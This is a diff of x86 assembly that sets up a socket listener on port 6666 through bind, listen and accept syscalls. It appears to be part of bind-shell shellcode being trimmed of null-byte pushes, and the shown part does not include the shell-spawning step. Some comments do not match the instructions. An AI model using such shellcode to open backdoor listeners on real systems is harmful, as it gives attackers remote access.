@@ -22,11 +22,10 @@ _start:
 
 	;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
 	xor eax, eax		; zero out EAX
-	push eax		; put 0x00 terminator on the stack
+	push eax
 	push word 0x0a1a	; push sa_data (protnr) = 6666 on the stack
 	push word 2 		; push sa_family = PF_INET = 2 on the stack
 	mov esi, esp		; put address of the struct sockaddr in ESI
-	push eax		; put 0x00 on the stack
 	push byte 16		; put addrlen of struct 16 = 2 * 8bytes on the stack
 	push esi		; put address of the struct sockaddr on the stack
 	push edi		; put address of the socketfd on the stack
@@ -37,7 +36,6 @@ _start:
 
 	;int listen(int sockfd, int backlog)
 	xor eax, eax		; zero out EAX
-	push eax		; put 0x00 on the stack
 	push 0x1 		; put 0x00 on the stack
 	push edi		; put address of the socketfd on the stack
 	mov ecx, esp		; put address of all the arguments for the listen function in ECX
@@ -47,7 +45,7 @@ _start:
 
 	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 	xor eax, eax		; zero out EAX
-	push eax		; put 0x00 on the stack
+	push eax
 	push eax		; put 0x00 on the stack
 	push edi		; put address of the socketfd on the stack
 	mov ecx, esp		; put address of all the arguments for the accept function in ECX
